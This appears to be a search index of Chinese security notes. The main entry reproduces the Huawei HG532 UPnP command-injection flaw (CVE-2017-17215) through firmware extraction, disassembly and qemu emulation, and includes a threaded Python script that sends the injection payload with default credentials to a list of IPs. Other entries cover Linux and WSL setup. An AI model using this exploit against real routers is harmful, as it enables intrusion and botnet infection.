\u201c/ctrlt/DeviceUpgrade_1\u201d \u8fd9\u4e2a\u5730\u5740\u63d0\u4ea4\u8bf7\u6c42 \u8bf7\u6c42\u4e2d\u5305\u542bNewStatusURL\u53caNewDownloadURL\u4e24\u4e2a\u5143\u7d20\u3002 \u8fdc\u7a0b\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7\u8be5\u6f0f\u6d1e\u5728\u8bbe\u5907\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4 \u5c06shell\u5143\u5b57\u7b26 \u6ce8\u5165NewStatusURL\u4ee5\u53caNewDownloadURL\u5143\u7d20\u4e2d \u5148\u8c03\u7528\u4e86\u4e00\u4e2axml\u76f8\u5173\u7684\u51fd\u6570\uff0c\u83b7\u53d6\u53c2\u6570\u7684\u503c\uff0c\u5f88\u660e\u663e\u7684\u770b\u5230\u4e86\u53c2\u6570\u62fc\u63a5\u7684\u884c\u4e3a\uff0c\u4e4b\u540e\u8c03\u7528\u4e86 system \u51fd\u6570 1 2 3 snprintf($s0, 0x400, 'upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -', NewDownloadURL, NewStatusURL) system($s0) \u4e0d\u8fc7\u8fd8\u6709\u4e00\u4e2a\u8ba4\u8bc1\u673a\u5236\u9700\u8981 Authorization \u5934 \u624d\u80fd\u8fc7\u6389 check , \u5426\u5219\u4f1a 401 \u5b9e\u9645\u6d4b\u8bd5 \u00b6 \u8def\u7531\u5668\u4e0b\u8f7d\u5730\u5740 \u5c1d\u8bd5\u76f4\u63a5\u8fd0\u884c\u811a\u672c\u5931\u8d25\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 root@ml-vm:/home/oit/tools/fat# ./sources/extractor/extractor.py -b iot -sql 127.0.0.1 -np -nk \"./HG532e.rar\" images -----------------Extractor Start---------------- input:./HG532e.rar output:images rootfs:True kernel:False parallel:False sql:127.0.0.1 brand:iot -----------------Extractor End------------------ >> Database Image ID: 146 /home/oit/tools/fat/HG532e.rar >> MD5: 9986b8aee8e1eb511a8bbb3a39b485e4 >> Tag: 146 >> Temp: /tmp/tmpLXreHs >> Status: Kernel: True, Rootfs: False, Do_Kernel: False, Do_Rootfs: True >>>> RAR archive data, first volume type: MAIN_HEAD >> Recursing into archive ... Traceback (most recent call last): File \"./sources/extractor/extractor.py\", line 425, in extract File \"./sources/extractor/extractor.py\", line 472, in _check_archive File \"./sources/extractor/extractor.py\", line 693, in _check_recursive File \"./sources/extractor/extractor.py\", line 381, in extract UnicodeDecodeError: 'ascii' codec can't decode byte 0xd8 in position 37: ordinal not in range(128) >> Cleaning up /tmp/tmpLXreHs... \u6253\u7b97\u7528qemu\u8fd0\u884c\u4e00\u4e2a\u865a\u62df\u673a\u6765\u641e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@ml-vm:/mnt/hgfs/IOTEXP/_router HG532e.rar.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted# sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append \"root=/dev/sda1 console=tty0\" -nographic -net nic -net tap,ifname=br0,script=no,downscript=no [ 0.000000] Initializing cgroup subsys cpuset [ 0.000000] Initializing cgroup subsys cpu [ 0.000000] Linux version 2.6.32-5-4kc-malta (Debian 2.6.32-48squeeze4) (dannf@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 Tue Sep 24 00:02:22 UTC 2013 [ 0.000000] [ 0.000000] LINUX started... [ 0.000000] bootconsole [early0] enabled [ 0.000000] CPU revision is: 00019300 (MIPS 24Kc) [ 0.000000] FPU revision is: 00739300 [ 0.000000] Determined physical RAM map: [ 0.000000] memory: 00001000 @ 00000000 (reserved) ... [ 0.000000] SLUB: Genslabs=7, HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1 [ 0.000000] Hierarchical RCU implementation. [ 0.000000] NR_IRQS:256 [ 0.000000] CPU frequency 200.00 MHz [ 0.000000] Console: colour dummy device 80x25 [ 0.000000] console [tty0] enabled, bootconsole disabled \u4f46\u662f\u4e00\u76f4\u6ca1\u6709\u6253\u5f00shell ebian mips qemu\u955c\u50cf \u6362\u4e86\u4e00\u4e2a\u78c1\u76d8\u548c\u5185\u6838\uff0c\u6210\u529f\u5730\u5f00\u542f\u4e86\u865a\u62df\u673a\u4f46\u662f\u7f51\u7edc\u914d\u7f6e\u6ca1\u6709\u6210\u529f \u672a\u5b8c\u5f85\u7eed\u3002\u3002 \u4fee\u6539\u4e86\u4e00\u4e0b /etc/network/interfaces \u6210\u529f\u4e86 1 scp -r ./squashfs-root root@192.168.104.187:/root \u6587\u4ef6\u62f7\u8d1d\u8fdb\u53bb \u8fdb\u5165\u865a\u62df\u673a\u4e4b\u540e\u5f00\u542f\u670d\u52a1 exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import threading , sys , time , random , socket , re , os , struct , array , requests from requests.auth import HTTPDigestAuth ips = open ( sys . argv [ 1 ], \"r\" ) . readlines () cmd = \"\" # Your MIPS (SSHD) rm = \"<?xml version= \\\" 1.0 \\\" ?> \\n <s:Envelope xmlns:s= \\\" http://schemas.xmlsoap.org/soap/envelope/ \\\" s:encodingStyle= \\\" http://schemas.xmlsoap.org/soap/encoding/ \\\" > \\n <s:Body><u:Upgrade xmlns:u= \\\" urn:schemas-upnp-org:service:WANPPPConnection:1 \\\" > \\n <NewStatusURL>$(\" + cmd + \")</NewStatusURL> \\n <NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL> \\n </u:Upgrade> \\n </s:Body> \\n </s:Envelope>\" class exploit ( threading . Thread ): def __init__ ( self , ip ): threading . Thread . __init__ ( self ) self . ip = str ( ip ) . rstrip ( ' \\n ' ) def run ( self ): try : url = \"http://\" + self . ip + \":37215/ctrlt/DeviceUpgrade_1\" requests . post ( url , timeout = 5 , auth = HTTPDigestAuth ( 'dslf-config' , 'admin' ), data = rm ) print \"[SOAP] Attempting to infect \" + self . ip except Exception as e : pass for ip in ips : try : n = exploit ( ip ) n . start () time . sleep ( 0.03 ) except : pass \u786e\u5b9e\u6210\u529f\u4e86 \u4f46\u662f\u6ca1\u6709\u865a\u62df\u673a\u4e0a\u6ca1\u6709\u8fd9\u4e2a\u547d\u4ee4emmm \u53c2\u8003 \u00b6 Huawei HG532 \u7cfb\u5217\u8def\u7531\u5668\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790 CVE-2017-17215\u8def\u7531\u5668\u6f0f\u6d1e\u5206\u6790","title":"\u534e\u4e3a\u8def\u7531\u5668Huawei HG532\u6f0f\u6d1e\u590d\u73b0\u8fc7\u7a0b"},{"location":"IOT/\u534e\u4e3a\u8def\u7531\u5668/#huawei-hg532","text":"","title":"\u534e\u4e3a\u8def\u7531\u5668Huawei HG532\u6f0f\u6d1e\u590d\u73b0\u8fc7\u7a0b"},{"location":"IOT/\u534e\u4e3a\u8def\u7531\u5668/#_1","text":"\u8fd9\u6b21\u51fa\u95ee\u9898\u7684\u70b9\u662f upnp \u7a0b\u5e8f 1 2 3 home/oit/Downloads/_router HG532e.rar-0.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin [oit@ubuntu] [18:36] > file upnp upnp: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked (uses shared libs), corrupted section header size \u662fMIPS32\u4f4d\u5927\u7aef\u683c\u5f0f UPnP \u662f\u7531\u201c\u901a\u7528\u5373\u63d2\u5373\u7528\u8bba\u575b\u201d\uff08UPnP\u2122 Forum\uff09\u63a8\u5e7f\u7684\u4e00\u5957\u7f51\u7edc\u534f\u8bae\u3002\u8be5\u534f\u8bae\u7684\u76ee\u6807\u662f\u4f7f\u5bb6\u5ead\u7f51\u7edc\uff08\u6570\u636e\u5171\u4eab\u3001\u901a\u4fe1\u548c\u5a31\u4e50\uff09\u548c\u516c\u53f8\u7f51\u7edc\u4e2d\u7684\u5404\u79cd\u8bbe\u5907\u80fd\u591f\u76f8\u4e92\u65e0\u7f1d\u8fde\u63a5\uff0c\u5e76\u7b80\u5316\u76f8\u5173\u7f51\u7edc\u7684\u5b9e\u73b0\u3002 \u4e22\u5230IDA\u4e2d\u5206\u6790 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 LOAD:004074FC la $a1, aNewstatusurl # \"NewStatusURL\" LOAD:00407500 move $a2, $zero LOAD:00407504 jalr $t9 ; ATP_XML_GetChildNodeByName LOAD:00407508 addiu $a3, $sp, 0x24 LOAD:0040750C lw $gp, 0x18($sp) LOAD:00407510 bnez $v0, loc_407564 LOAD:00407514 move $s1, $v0 LOAD:00407518 lw $v0, 0x24($sp) LOAD:0040751C nop LOAD:00407520 beqz $v0, loc_407564 LOAD:00407524 addiu $s0, $sp, 0x28 LOAD:00407528 la $t9, snprintf LOAD:0040752C lw $a3, 0x20($sp) LOAD:00407530 la $a2, aUpgGUST1Firmwa # \"upg -g -U %s -t '1 Firmware Upgrade Ima\"... LOAD:00407538 move $a0, $s0 LOAD:0040753C li $a1, 0x400 LOAD:00407540 jalr $t9 ; snprintf LOAD:00407544 sw $v0, 0x10($sp) LOAD:00407548 lw $gp, 0x18($sp) LOAD:0040754C nop OAD:00407520 beqz $v0, loc_407564 LOAD:00407524 addiu $s0, $sp, 0x28 LOAD:00407528 la $t9, snprintf LOAD:0040752C lw $a3, 0x20($sp) LOAD:00407530 la $a2, aUpgGUST1Firmwa # \"upg -g -U %s -t '1 Firmware Upgrade Ima\"... LOAD:00407538 move $a0, $s0 LOAD:0040753C li $a1, 0x400 LOAD:00407540 jalr $t9 ; snprintf LOAD:00407544 sw $v0, 0x10($sp) LOAD:00407548 lw $gp, 0x18($sp) LOAD:0040754C nop LOAD:00407550 la $t9, system #\u6267\u884csystem \u5206\u6790upnp\u63cf\u8ff0\u4fe1\u606f\u540e \u53d1\u73b0\u8be5\u8bbe\u5907\u652f\u6301\u540d\u4e3a DeviceUpgrade \u7684\u4e00\u79cd\u670d\u52a1\u7c7b\u578b \u8bbe\u5907\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u670d\u52a1\u66f4\u65b0\u56fa\u4ef6 \u5177\u4f53\u8fc7\u7a0b\u662f\u5411 \u201c/ctrlt/DeviceUpgrade_1\u201d \u8fd9\u4e2a\u5730\u5740\u63d0\u4ea4\u8bf7\u6c42 \u8bf7\u6c42\u4e2d\u5305\u542bNewStatusURL\u53caNewDownloadURL\u4e24\u4e2a\u5143\u7d20\u3002 \u8fdc\u7a0b\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7\u8be5\u6f0f\u6d1e\u5728\u8bbe\u5907\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4 \u5c06shell\u5143\u5b57\u7b26 \u6ce8\u5165NewStatusURL\u4ee5\u53caNewDownloadURL\u5143\u7d20\u4e2d \u5148\u8c03\u7528\u4e86\u4e00\u4e2axml\u76f8\u5173\u7684\u51fd\u6570\uff0c\u83b7\u53d6\u53c2\u6570\u7684\u503c\uff0c\u5f88\u660e\u663e\u7684\u770b\u5230\u4e86\u53c2\u6570\u62fc\u63a5\u7684\u884c\u4e3a\uff0c\u4e4b\u540e\u8c03\u7528\u4e86 system \u51fd\u6570 1 2 3 snprintf($s0, 0x400, 'upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -', NewDownloadURL, NewStatusURL) system($s0) \u4e0d\u8fc7\u8fd8\u6709\u4e00\u4e2a\u8ba4\u8bc1\u673a\u5236\u9700\u8981 Authorization \u5934 \u624d\u80fd\u8fc7\u6389 check , \u5426\u5219\u4f1a 401","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"IOT/\u534e\u4e3a\u8def\u7531\u5668/#_2","text":"\u8def\u7531\u5668\u4e0b\u8f7d\u5730\u5740 \u5c1d\u8bd5\u76f4\u63a5\u8fd0\u884c\u811a\u672c\u5931\u8d25\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 root@ml-vm:/home/oit/tools/fat# ./sources/extractor/extractor.py -b iot -sql 127.0.0.1 -np -nk \"./HG532e.rar\" images -----------------Extractor Start---------------- input:./HG532e.rar output:images rootfs:True kernel:False parallel:False sql:127.0.0.1 brand:iot -----------------Extractor End------------------ >> Database Image ID: 146 /home/oit/tools/fat/HG532e.rar >> MD5: 9986b8aee8e1eb511a8bbb3a39b485e4 >> Tag: 146 >> Temp: /tmp/tmpLXreHs >> Status: Kernel: True, Rootfs: False, Do_Kernel: False, Do_Rootfs: True >>>> RAR archive data, first volume type: MAIN_HEAD >> Recursing into archive ... Traceback (most recent call last): File \"./sources/extractor/extractor.py\", line 425, in extract File \"./sources/extractor/extractor.py\", line 472, in _check_archive File \"./sources/extractor/extractor.py\", line 693, in _check_recursive File \"./sources/extractor/extractor.py\", line 381, in extract UnicodeDecodeError: 'ascii' codec can't decode byte 0xd8 in position 37: ordinal not in range(128) >> Cleaning up /tmp/tmpLXreHs... \u6253\u7b97\u7528qemu\u8fd0\u884c\u4e00\u4e2a\u865a\u62df\u673a\u6765\u641e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@ml-vm:/mnt/hgfs/IOTEXP/_router HG532e.rar.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted# sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append \"root=/dev/sda1 console=tty0\" -nographic -net nic -net tap,ifname=br0,script=no,downscript=no [ 0.000000] Initializing cgroup subsys cpuset [ 0.000000] Initializing cgroup subsys cpu [ 0.000000] Linux version 2.6.32-5-4kc-malta (Debian 2.6.32-48squeeze4) (dannf@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 Tue Sep 24 00:02:22 UTC 2013 [ 0.000000] [ 0.000000] LINUX started... [ 0.000000] bootconsole [early0] enabled [ 0.000000] CPU revision is: 00019300 (MIPS 24Kc) [ 0.000000] FPU revision is: 00739300 [ 0.000000] Determined physical RAM map: [ 0.000000] memory: 00001000 @ 00000000 (reserved) ... [ 0.000000] SLUB: Genslabs=7, HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1 [ 0.000000] Hierarchical RCU implementation. [ 0.000000] NR_IRQS:256 [ 0.000000] CPU frequency 200.00 MHz [ 0.000000] Console: colour dummy device 80x25 [ 0.000000] console [tty0] enabled, bootconsole disabled \u4f46\u662f\u4e00\u76f4\u6ca1\u6709\u6253\u5f00shell ebian mips qemu\u955c\u50cf \u6362\u4e86\u4e00\u4e2a\u78c1\u76d8\u548c\u5185\u6838\uff0c\u6210\u529f\u5730\u5f00\u542f\u4e86\u865a\u62df\u673a\u4f46\u662f\u7f51\u7edc\u914d\u7f6e\u6ca1\u6709\u6210\u529f \u672a\u5b8c\u5f85\u7eed\u3002\u3002 \u4fee\u6539\u4e86\u4e00\u4e0b /etc/network/interfaces \u6210\u529f\u4e86 1 scp -r ./squashfs-root root@192.168.104.187:/root \u6587\u4ef6\u62f7\u8d1d\u8fdb\u53bb \u8fdb\u5165\u865a\u62df\u673a\u4e4b\u540e\u5f00\u542f\u670d\u52a1 exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import threading , sys , time , random , socket , re , os , struct , array , requests from requests.auth import HTTPDigestAuth ips = open ( sys . argv [ 1 ], \"r\" ) . readlines () cmd = \"\" # Your MIPS (SSHD) rm = \"<?xml version= \\\" 1.0 \\\" ?> \\n <s:Envelope xmlns:s= \\\" http://schemas.xmlsoap.org/soap/envelope/ \\\" s:encodingStyle= \\\" http://schemas.xmlsoap.org/soap/encoding/ \\\" > \\n <s:Body><u:Upgrade xmlns:u= \\\" urn:schemas-upnp-org:service:WANPPPConnection:1 \\\" > \\n <NewStatusURL>$(\" + cmd + \")</NewStatusURL> \\n <NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL> \\n </u:Upgrade> \\n </s:Body> \\n </s:Envelope>\" class exploit ( threading . Thread ): def __init__ ( self , ip ): threading . Thread . __init__ ( self ) self . ip = str ( ip ) . rstrip ( ' \\n ' ) def run ( self ): try : url = \"http://\" + self . ip + \":37215/ctrlt/DeviceUpgrade_1\" requests . post ( url , timeout = 5 , auth = HTTPDigestAuth ( 'dslf-config' , 'admin' ), data = rm ) print \"[SOAP] Attempting to infect \" + self . ip except Exception as e : pass for ip in ips : try : n = exploit ( ip ) n . start () time . sleep ( 0.03 ) except : pass \u786e\u5b9e\u6210\u529f\u4e86 \u4f46\u662f\u6ca1\u6709\u865a\u62df\u673a\u4e0a\u6ca1\u6709\u8fd9\u4e2a\u547d\u4ee4emmm","title":"\u5b9e\u9645\u6d4b\u8bd5"},{"location":"IOT/\u534e\u4e3a\u8def\u7531\u5668/#_3","text":"Huawei HG532 \u7cfb\u5217\u8def\u7531\u5668\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790 CVE-2017-17215\u8def\u7531\u5668\u6f0f\u6d1e\u5206\u6790","title":"\u53c2\u8003"},{"location":"IOT/\u79ef\u7d2f\u4e00\u4e0bLinux\u7684\u7f51\u7edc\u914d\u7f6e\u5e38\u8bc6/","text":"\u79ef\u7d2f\u4e00\u4e0bLinux\u7684\u7f51\u7edc\u914d\u7f6e\u5e38\u8bc6 \u00b6 1 ifconfig eth0 192.168.0.100 \u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u4e3aeth0\u8fd9\u4e2a\u7f51\u5361\u7684IP\u8bbe\u7f6e\u4e3a192.168.0.100\u3002\u4f46\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u662f\u6301\u7eed\u751f\u6548\u7684\uff0c\u4e00\u65e6\u4f60reboot\u540eservice network restart\u540e\uff0ceth0\u5bf9\u5e94\u7684IP\u4f9d\u65e7\u4f1a\u6539\u53d8\u3002 \u4fee\u6539\u7f51\u7edc\u914d\u7f6e\u6587\u4ef6 \u00b6","title":"\u79ef\u7d2f\u4e00\u4e0bLinux\u7684\u7f51\u7edc\u914d\u7f6e\u5e38\u8bc6"},{"location":"IOT/\u79ef\u7d2f\u4e00\u4e0bLinux\u7684\u7f51\u7edc\u914d\u7f6e\u5e38\u8bc6/#linux","text":"1 ifconfig eth0 192.168.0.100 \u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u4e3aeth0\u8fd9\u4e2a\u7f51\u5361\u7684IP\u8bbe\u7f6e\u4e3a192.168.0.100\u3002\u4f46\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u662f\u6301\u7eed\u751f\u6548\u7684\uff0c\u4e00\u65e6\u4f60reboot\u540eservice network restart\u540e\uff0ceth0\u5bf9\u5e94\u7684IP\u4f9d\u65e7\u4f1a\u6539\u53d8\u3002","title":"\u79ef\u7d2f\u4e00\u4e0bLinux\u7684\u7f51\u7edc\u914d\u7f6e\u5e38\u8bc6"},{"location":"IOT/\u79ef\u7d2f\u4e00\u4e0bLinux\u7684\u7f51\u7edc\u914d\u7f6e\u5e38\u8bc6/#_1","text":"","title":"\u4fee\u6539\u7f51\u7edc\u914d\u7f6e\u6587\u4ef6"},{"location":"IOT/\u7fa4\u6656\u8def\u7531\u5668\u2014\u2014SRM_RT1900ac_8017/","text":"SRM_RT1900ac_8017 \u00b6 \u5b98\u7f51\u4e0b\u8f7d\u4e0b\u6765\u7684\u662f\u4e00\u79cd POSIX \u7684\u5f52\u6863\u6587\u4ef6\uff0c\u52a0\u538b\u4e4b\u540e\u770b\u5230\u5176\u4e2d\u6709\u4e00\u4e2a hda1 \u4e8e\u662f\u5c06\u5176\u62d6\u5165\u5230\u865a\u62df\u673a\u4e2d\u5206\u6790 \u63d0\u53d6\u6210\u529f\u4e862333 id\u662f179\u53f7 \u4f46\u662f\u5f53\u6211\u60f3\u8981\u5236\u4f5c qemu \u955c\u50cf\u7684\u65f6\u5019\u5931\u8d25\u4e86 \u539f\u6765\u662f\u8981\u5148\u5165\u5e93 \u4f46\u662f\u5728\u914d\u7f6e\u914d\u7f6e\u7f51\u7edc\u6ca1\u6709\u6210\u529f\uff1f \u76f8\u5173CVE \u00b6 https://www.anquanke.com/vul/id/1558358","title":"SRM_RT1900ac_8017"},{"location":"IOT/\u7fa4\u6656\u8def\u7531\u5668\u2014\u2014SRM_RT1900ac_8017/#srm_rt1900ac_8017","text":"\u5b98\u7f51\u4e0b\u8f7d\u4e0b\u6765\u7684\u662f\u4e00\u79cd POSIX \u7684\u5f52\u6863\u6587\u4ef6\uff0c\u52a0\u538b\u4e4b\u540e\u770b\u5230\u5176\u4e2d\u6709\u4e00\u4e2a hda1 \u4e8e\u662f\u5c06\u5176\u62d6\u5165\u5230\u865a\u62df\u673a\u4e2d\u5206\u6790 \u63d0\u53d6\u6210\u529f\u4e862333 id\u662f179\u53f7 \u4f46\u662f\u5f53\u6211\u60f3\u8981\u5236\u4f5c qemu \u955c\u50cf\u7684\u65f6\u5019\u5931\u8d25\u4e86 \u539f\u6765\u662f\u8981\u5148\u5165\u5e93 \u4f46\u662f\u5728\u914d\u7f6e\u914d\u7f6e\u7f51\u7edc\u6ca1\u6709\u6210\u529f\uff1f","title":"SRM_RT1900ac_8017"},{"location":"IOT/\u7fa4\u6656\u8def\u7531\u5668\u2014\u2014SRM_RT1900ac_8017/#cve","text":"https://www.anquanke.com/vul/id/1558358","title":"\u76f8\u5173CVE"},{"location":"IOT/\u8def\u7531\u5668\u7684\u4e00\u4e9b\u73af\u5883\u914d\u7f6e\u5de5\u4f5c/","text":"\u8def\u7531\u5668\u7684\u4e00\u4e9b\u73af\u5883\u914d\u7f6e\u5de5\u4f5c \u00b6 etc/network/interfaces \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 > sudo cat /etc/network/interfaces [sudo] password for oit: # interfaces(5) file used by ifup(8) and ifdown(8) auto lo iface lo inet loopback auto eth0 iface eth0 inet manual up ifconfig eth0 0.0.0.0 up auto br0 iface br0 inet dhcp bridge_ports eth0 bridge_stp off bridge_maxwait 1 \u7136\u540e\u542f\u52a8\u865a\u62df\u673a\uff1a 1 \u8fd9\u65f6\u5019\u795e\u5947\u7684\u80fd ping \u901a\u4e86","title":"\u8def\u7531\u5668\u7684\u4e00\u4e9b\u73af\u5883\u914d\u7f6e\u5de5\u4f5c"},{"location":"IOT/\u8def\u7531\u5668\u7684\u4e00\u4e9b\u73af\u5883\u914d\u7f6e\u5de5\u4f5c/#_1","text":"","title":"\u8def\u7531\u5668\u7684\u4e00\u4e9b\u73af\u5883\u914d\u7f6e\u5de5\u4f5c"},{"location":"IOT/\u8def\u7531\u5668\u7684\u4e00\u4e9b\u73af\u5883\u914d\u7f6e\u5de5\u4f5c/#etcnetworkinterfaces","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 > sudo cat /etc/network/interfaces [sudo] password for oit: # interfaces(5) file used by ifup(8) and ifdown(8) auto lo iface lo inet loopback auto eth0 iface eth0 inet manual up ifconfig eth0 0.0.0.0 up auto br0 iface br0 inet dhcp bridge_ports eth0 bridge_stp off bridge_maxwait 1 \u7136\u540e\u542f\u52a8\u865a\u62df\u673a\uff1a 1 \u8fd9\u65f6\u5019\u795e\u5947\u7684\u80fd ping \u901a\u4e86","title":"etc/network/interfaces"},{"location":"Linux/","text":"Linux hack\u547d\u4ee4","title":"Index"},{"location":"Linux/Linuxshell\u7f16\u7a0b/","text":"Linuxshell\u7f16\u7a0b \u00b6 \u5faa\u73af \u00b6","title":"Linuxshell\u7f16\u7a0b"},{"location":"Linux/Linuxshell\u7f16\u7a0b/#linuxshell","text":"","title":"Linuxshell\u7f16\u7a0b"},{"location":"Linux/Linuxshell\u7f16\u7a0b/#_1","text":"","title":"\u5faa\u73af"},{"location":"Linux/Linux\u78c1\u76d8\u7ba1\u7406/","text":"Linux\u78c1\u76d8\u7ba1\u7406 \u00b6 \u5217\u51fa\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5927\u5c0f \u00b6 du -h --max-depth=1","title":"Linux\u78c1\u76d8\u7ba1\u7406"},{"location":"Linux/Linux\u78c1\u76d8\u7ba1\u7406/#linux","text":"","title":"Linux\u78c1\u76d8\u7ba1\u7406"},{"location":"Linux/Linux\u78c1\u76d8\u7ba1\u7406/#_1","text":"du -h --max-depth=1","title":"\u5217\u51fa\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5927\u5c0f"},{"location":"Linux/WSL\u8fdc\u7a0b\u8c03\u8bd5/","text":"WSL\u8fdc\u7a0b\u8c03\u8bd5 \u00b6 \u7ec8\u4e8e\u6210\u529f\u5730\u914d\u7f6e\u597d\u4e86\u8fdc\u7a0b\u8c03\u8bd5\u7684\u73af\u5883\uff0c\u5fc3\u91cc\u7f8e\u6ecb\u6ecb \u5148\u628a\u4e00\u4e9b\u914d\u7f6e\u6587\u4ef6\u7684\u5185\u5bb9\u653e\u4e0a\u6765\uff1a c_cpp_properties.json \u6587\u4ef6\u5982\u4e0b\uff1a 1 \u8fd9\u4e2a\u6587\u4ef6\u5176\u5b9e\u662f\u8ba9\u4f60\u66f4\u52a0\u6109\u5feb\u5730\u7f16\u5199C\u8bed\u8a00 tasks.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 { \"version\": \"2.0.0\", \"windows\": { \"options\": { \"shell\": { \"executable\": \"bash.exe\", \"args\": [\"-c\"] } } }, \"tasks\": [ { \"label\": \"build hello world on WSL\", \"type\": \"shell\", \"command\": \"g++\", \"args\": [ \"-g\", \"-o\", \"/home/pxy/projects/helloworld/helloworld.out\", \"helloworld.cpp\" ], \"group\": { \"kind\": \"build\", \"isDefault\": true } } ] } \u8fd9\u4e2a\u6587\u4ef6\u6307\u660e\u4e86\u4f60\u9700\u8981\u7f16\u8bd1\u7684\u6e90\u6587\u4ef6\u548c\u8f93\u51fa\u7684\u53ef\u6267\u884c\u6587\u4ef6 launch.json \u8fd9\u4e2a\u6587\u4ef6\u662f\u81ea\u52a8\u751f\u6210\u7684(\u9700\u8981\u6307\u660e\u4f60\u8981\u8c03\u8bd5\u7684\u7a0b\u5e8f)\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6587\u4ef6\u7684\u4f5c\u7528\u5c31\u662f\u8c03\u8bd5\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 { // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 \"version\": \"0.2.0\", \"configurations\": [ { \"name\": \"(gdb) Launch\", \"type\": \"cppdbg\", \"request\": \"launch\", \"program\": \"/home/pxy/projects/helloworld/helloworld.out\", \"args\": [\"-exec info registers\"], \"stopAtEntry\": false, \"cwd\": \"${workspaceFolder}\", \"environment\": [], \"externalConsole\": false, \"MIMode\": \"gdb\", \"setupCommands\": [ { \"description\": \"Enable pretty-printing for gdb\", \"text\": \"-enable-pretty-printing\", \"ignoreFailures\": true } ] } ] } \u552f\u4e00\u9057\u61be\u7684\u5c31\u662f\u6ca1\u6cd5\u914d\u7f6egdb\u542f\u52a8\u7684\u53c2\u6570 \u4e0d\u8fc7\u6211\u662f\u4e0d\u662f\u53ef\u4ee5\u5b89\u88c5gdb\u7684\u63d2\u4ef6\u6765\u89e3\u51b3233 \u6700\u540e\u8bf4\u4e00\u4e0bwin64\u4f4d\u662f\u6ca1\u6709 sysnative \u6587\u4ef6\u5939\u7684\uff0c\u4f46\u662f\u5b83\u5176\u5b9e\u662f\u5b58\u5728\u7684 \u81f3\u4e8e\u5b98\u65b9\u6587\u6863\u6700\u540e\u7684\u90a3\u4e2a\u521b\u5efa launch.json \u662f\u600e\u4e48\u505a\u5230\u7684\u6211\u4e5f\u6ca1\u770b\u61c2","title":"WSL\u8fdc\u7a0b\u8c03\u8bd5"},{"location":"Linux/WSL\u8fdc\u7a0b\u8c03\u8bd5/#wsl","text":"\u7ec8\u4e8e\u6210\u529f\u5730\u914d\u7f6e\u597d\u4e86\u8fdc\u7a0b\u8c03\u8bd5\u7684\u73af\u5883\uff0c\u5fc3\u91cc\u7f8e\u6ecb\u6ecb \u5148\u628a\u4e00\u4e9b\u914d\u7f6e\u6587\u4ef6\u7684\u5185\u5bb9\u653e\u4e0a\u6765\uff1a c_cpp_properties.json \u6587\u4ef6\u5982\u4e0b\uff1a 1 \u8fd9\u4e2a\u6587\u4ef6\u5176\u5b9e\u662f\u8ba9\u4f60\u66f4\u52a0\u6109\u5feb\u5730\u7f16\u5199C\u8bed\u8a00 tasks.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 { \"version\": \"2.0.0\", \"windows\": { \"options\": { \"shell\": { \"executable\": \"bash.exe\", \"args\": [\"-c\"] } } }, \"tasks\": [ { \"label\": \"build hello world on WSL\", \"type\": \"shell\", \"command\": \"g++\", \"args\": [ \"-g\", \"-o\", \"/home/pxy/projects/helloworld/helloworld.out\", \"helloworld.cpp\" ], \"group\": { \"kind\": \"build\", \"isDefault\": true } } ] } \u8fd9\u4e2a\u6587\u4ef6\u6307\u660e\u4e86\u4f60\u9700\u8981\u7f16\u8bd1\u7684\u6e90\u6587\u4ef6\u548c\u8f93\u51fa\u7684\u53ef\u6267\u884c\u6587\u4ef6 launch.json 